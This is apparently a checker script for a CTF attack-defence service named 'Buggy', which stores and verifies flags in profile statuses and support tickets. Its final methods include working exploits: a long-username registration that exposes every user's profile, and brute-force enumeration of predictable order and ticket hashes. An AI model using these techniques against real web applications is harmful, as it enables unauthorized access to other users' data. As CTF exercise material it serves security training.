import html
import random
import requests
import string

from enochecker import *
from enochecker.utils import sha256ify

# exploit
import re
from bs4 import BeautifulSoup as BS
from datetime import datetime, timedelta
from hashlib import sha256
from time import sleep, time


def random_string(amount):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(amount))


class BuggyChecker(BaseChecker):
    port = 7890
    flag_count = 2
    noise_count = 1
    havoc_count = 1
    service_name = "Buggy"


    def putflag(self) -> None:
        if (self.flag_idx % 2) == 0:
            self.put_status()
        else:
            self.put_ticket()

    def put_status(self) -> None:
        self.logger.debug("Starting putflag - status")
        username, password, cookies = self.register()

        # View Profile
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (0)", response.text, "Profile failed")
        assert_in("orders: (0)", response.text, "Profile failed")

        response = self.http_post(route=f"/profile", cookies=cookies, data={"status": self.flag})
        assert_equals(302, response.status_code, "Status failed")
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Status failed")
        assert_in(self.flag, response.text, "Status failed")

        self.logger.debug(f"saving creds")
        self.team_db[sha256ify(self.flag)] = (username, password)

        self.logger.debug("Done putflag - status")

    def put_ticket(self) -> None:
        self.logger.debug("Starting putflag - ticket")
        username, password, cookies = self.register()
        # Place order
        buggy = random.choice(["super", "mega"])
        color = random.choice(["terminal-turquoise", "cyber-cyan", "buggy-blue"])
        quantity = random.randint(1, 99)
        response = self.http_post(route=f"/{buggy}-buggy", cookies=cookies, data={"color":color, "quantity":quantity})
        assert_equals(302, response.status_code, "Order failed")
        assert_equals(response.next.url, response.url, "Order failed")
        self.logger.debug("order placed")
        # Write ticket
        subject = random_string(20)
        response = self.http_post(route="/tickets", cookies=cookies, data={"subject":subject, "message":self.flag})
        self.logger.debug("ticket written")
        assert_equals(302, response.status_code, "Ticket failed")
        assert_equals(64, len(response.next.url.split("/")[-1]), "Ticket failed")
        try:
            hash = response.headers["location"].split("/")[-1].strip()
        except Exception:
            raise BrokenServiceException("Ticket failed")
        assert_equals(64, len(hash), "Ticket failed")

        # View order and ticket
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (1)", response.text, "Profile failed")
        assert_in("orders: (1)", response.text, "Profile failed")

        self.logger.debug(f"saving hash and order : {hash}")
        self.team_db[sha256ify(self.flag)] = (hash, username, password)

        self.logger.debug("Done putflag - ticket")

    def register(self) -> (str, str, requests.cookies.RequestsCookieJar):
        username = random_string(20)
        password = random_string(20)

        # Register
        response = self.http_post(route="/register", data={"username":username, "pw":password},
                allow_redirects=False)
        cookies = response.cookies
        if not cookies["buggy-cookie"]:
            self.logger.debug(f"Failed register for user {username}")
            raise BrokenServiceException("Cookies missing")
        assert_equals(302, response.status_code, "Registration failed")
        assert_equals(response.next.url, response.url.replace("register", ""), "Registration failed")

        # Logout
        response = self.http_get(route="/logout", cookies=cookies)
        if response.cookies:
            self.logger.debug(f"Failed logout for user {username}")
            raise BrokenServiceException("Logout failed")
        assert_equals(302, response.status_code, "Logout failed")
        assert_equals(response.next.url, response.url.replace("logout", ""), "Logout failed")

        # Login
        response = self.http_post(route="/login", data={"username": username, "pw": password})
        if not response.cookies["buggy-cookie"]:
            self.logger.debug(f"Failed login for user {username}")
            raise BrokenServiceException("Cookies missing")
        assert_equals(302, response.status_code, "Login failed")
        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")
        self.logger.debug("registered and logged in")
        return username, password, response.cookies

    def getflag(self) -> None:
        if (self.flag_idx % 2) == 0:
            self.get_status()
        else:
            self.get_ticket()

    def get_status(self) -> None:
        self.logger.debug("Starting getflag - status")
        try:
            (username, password) = self.team_db[sha256ify(self.flag)]
        except KeyError as e:
            self.logger.warning(f"flag info missing, {e}")
            return Result.MUMBLE
        response = self.http_post(route="/login", data={"username": username, "pw": password})
        cookies = response.cookies
        if not cookies["buggy-cookie"]:
            self.logger.debug(f"Failed login for user {username}")
            raise BrokenServiceException("Cookies missing")
        assert_equals(302, response.status_code, "Login failed")
        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")

        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in(self.flag, response.text, "Flag missing")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (0)", response.text, "Profile failed")
        assert_in("orders: (0)", response.text, "Profile failed")
        self.logger.debug("Done getflag - status")

    def get_ticket(self) -> None:
        # TODO: Check order?
        self.logger.debug("Starting getflag - ticket")
        try:
            (hash, username, password) = self.team_db[sha256ify(self.flag)]
        except KeyError as e:
            self.logger.warning(f"flag info missing, {e}")
            return Result.MUMBLE
        response = self.http_post(route="/login", data={"username": username, "pw": password})
        cookies = response.cookies
        if not cookies["buggy-cookie"]:
            self.logger.debug(f"Failed login for user {username}")
            raise BrokenServiceException("Cookies missing")
        assert_equals(302, response.status_code, "Login failed")
        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")
        response = self.http_get(route=f"/tickets/{hash}", cookies=cookies)
        assert_equals(200, response.status_code, "Login failed")
        assert_in(self.flag, response.text, "Flag missing")

        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (1)", response.text, "Profile failed")
        assert_in("orders: (1)", response.text, "Profile failed")
        self.logger.debug("Done getflag - ticket")

    def putnoise(self) -> None:

        status = [
            "Beeing Funky!",
            "Im in ur base, killing ur d00dz",
            "Do or do not. There is no try.",
            "You must unlearn what you have learned.",
            "The greatest teacher, failure is.",
            "Pass on what you have learned.",
            "I’m too lazy to stop being lazy.",
            "Operator! Give me the number for 911!",
            "Kids, just because I don’t care doesn’t mean I’m not listening.",
            "Even communism works… in theory"

        ]
        messages = [
            "KHAAAAN!",
            "Do what I do. Hold tight and pretend it’s a plan!",
            "Never run when you’re scared.",
            "Superior intelligence and senseless cruelty just do not go together.",
            "Come on, Rory! It isn’t rocket science, it’s just quantum physics!",
            "Always take a banana to a party, Rose: bananas are good!",
            "Never be certain of anything. It’s a sign of weakness.",
            "Two things are infinite: the universe and human stupidity; and I'm not sure about the universe.",
            "A gun is not a weapon, it’s a tool, like a hammer or a screwdriver or an alligator."
        ]

        self.logger.info("Starting putnoise")
        username, password, cookies = self.register()

        # View Profile
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        #assert_in("Tickets: (0)", response.text, "Profile failed")
        #assert_in("orders: (0)", response.text, "Profile failed")

        # Set Status
        response = self.http_post(route=f"/profile", cookies=cookies, data={"status": random.choice(status) + self.noise})
        assert_equals(302, response.status_code, "Status failed")
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Status failed")
        assert_in(self.noise, response.text, "Status failed")

        # Place Order
        buggy = random.choice(["super", "mega"])
        color = random.choice(["terminal-turquoise", "cyber-cyan", "buggy-blue"])
        quantity = random.randint(1, 99)
        response = self.http_post(route=f"/{buggy}-buggy", cookies=cookies, data={"color":color, "quantity":quantity})
        assert_equals(302, response.status_code, "Order failed")
        assert_equals(response.next.url, response.url, "Order failed")
        self.logger.debug("order placed")

        # Write Ticket
        subject = random_string(20)
        response = self.http_post(route="/tickets", cookies=cookies, data={"subject":subject, "message":random.choice(messages) + self.noise})
        self.logger.debug("ticket written")
        assert_equals(302, response.status_code, "Ticket failed")
        assert_equals(64, len(response.next.url.split("/")[-1]), "Ticket failed")
        try:
            hash = response.headers["location"].split("/")[-1].strip()
        except Exception:
            raise BrokenServiceException("Ticket failed")
        assert_equals(64, len(hash), "Ticket failed")

        # View order and ticket
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (1)", response.text, "Profile failed")
        assert_in("orders: (1)", response.text, "Profile failed")

        self.logger.debug(f"saving creds")
        # self.team_db[sha256ify(self.flag)] = (username, password)
        self.team_db[sha256ify(self.noise)] = (username, password)

        self.logger.debug("Done putnoise - status")

    def getnoise(self) -> None:
        self.logger.info("Starting getnoise")

        try:
            (username, password) = self.team_db[sha256ify(self.noise)]
        except KeyError as e:
            self.logger.warning(f"noise info missing, {e}")
            return Result.MUMBLE
        response = self.http_post(route="/login", data={"username": username, "pw": password})
        cookies = response.cookies
        if not cookies["buggy-cookie"]:
            self.logger.debug(f"Failed login for user {username}")
            raise BrokenServiceException("Cookies missing")
        assert_equals(302, response.status_code, "Login failed")
        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")

        # check profile
        response = self.http_get(route=f"/profile", cookies=cookies)
        assert_in(self.noise, response.text, "Noise missing")
        assert_equals(200, response.status_code, "Profile failed")
        assert_in("buggy-team", response.text, "Profile failed")
        assert_in("enjoy your stay!", response.text, "Profile failed")
        assert_in("questions or feedback?", response.text, "Profile failed")
        assert_in("Tickets: (1)", response.text, "Profile failed")
        assert_in("orders: (1)", response.text, "Profile failed")

        self.logger.debug("Done getnoise - status")

    def havoc(self) -> None:
        self.logger.info("Starting havoc")
        # TODO
        return
        # Register account
        response = self.http_post(route="/register", data={"username":username, "pw":password},
                allow_redirects=False)
        self.logger.debug("register done")

        assert_equals(302, response.status_code, "registration failed")

        cookies = response.cookies
        # TODO: Choose comment from list
        comment = "Awesome!"
        # Post Comment
        buggy = random.choice(["super", "mega"])
        response = self.http_post(route=f"/{buggy}-buggy", data={"comment":comment},
                cookies=cookies, allow_redirects=False)
        self.logger.debug("comment written")

        assert_equals(302, response.status_code, "commenting failed")

        cookies = response.cookies
        # Write ticket
        subject = random_string(20)
        response = self.http_post(route="/tickets", data={"subject":subject, "message":self.flag},
                cookies=cookies, allow_redirects=False)
        self.logger.debug("ticket written")

        assert_equals(302, response.status_code, "ticket failed")

        try:
            hash = response.headers["location"].split("/")[-1].strip()
        except Exception:
            raise BrokenServiceException("ticket redirect failed")

        assert_equals(64, len(hash), "ticket redirect failed")

        self.logger.debug(f"saving hash : {hash}")
        self.team_db[sha256ify(self.flag)] = (hash, username, password)

    def exploit(self) -> None:
        if random.choice([0,1]) == 0:
            self.exploit_status()
        else:
            self.exploit_ticket()

    def exploit_status(self) -> None:
        """
        Status Exploit
        --------------------------------------------------
        Trivial exploit if you know what to do, also relatively easy to fix.
        --------------------------------------------------
        Steps:
        - Register as user with len(username) > 64
        - You will get a valid session although no user is inserted in the database
        - Navigate to /user/<anystring>
        - Because of a buggy if comparison in the keepUser function, you will get all user profiles
        - Get flags from status field
        """
        password = random_string(20)
        username = random_string(65)
        response = self.http_post(route="/register", data={"username":username, "pw":password})
        r = self.http_get(route=f"/user/itdoesntevenmatter", cookies=response.cookies)
        print(r.text)  # Flags in here

    def exploit_ticket(self) -> None:
        """
        Ticket Exploit
        --------------------------------------------------
        Enumeration-heavy exploit which should not be too hard to find and fix.
        --------------------------------------------------
        Steps:
        - Register a user
        - Enumerate possible order hashes using color+itemId+quantity
        - Get usernames from orders
          ( - It's probably a good idea to get and use the order id too)
        - Enumerate possible tickets using username+timestamp
        - Get flag from ticket message
        """
        password = random_string(20)
        username = random_string(65)
        response = self.http_post(route="/register", data={"username":username, "pw":password})
        cookies = response.cookies
        c = ["terminal-turquoise", "cyber-cyan", "buggy-blue"]
        i = ["1", "2"]
        q = [str(x) for x in range(99)]
        users = set()
        for x in c:
            for y in i:
                for z in q:
                    h = hash_func(x, y, z)
                    r = self.http_get(route=f"/orders/{h}", cookies=cookies,
                        allow_redirects=False)
                    if r.status_code == 200:
                        user = ""
                        for line in r.text.split("\n"):
                            if "User:" in line:
                                user = line.split("<h3>User:")[1].strip().split("</h3")[0]
                                users.add(user)
        t = str(int(time()))[:-1]
        for user in users:
            for i in range(int(t)-100, int(t)):
                h = hash_func(user, str(i))
                r = self.http_get(route=f"/tickets/{h}", cookies=cookies)
                if "Ticket" in r.text or "buggy-team" in r.text:
                    print(r.text)  # Flag in here


def hash_func(*args):
    b = bytearray([0 for x in range(64)])
    for s in args:
        for i in range(64):
            b[i] = (ord(s[((i+1)%len(s))]) ^ ord(s[(i%len(s))])) ^ b[i]
    h = sha256()
    h.update(b)
    h = h.hexdigest()
    return h


app = BuggyChecker.service

if __name__ == "__main__":
    run(BuggyChecker)
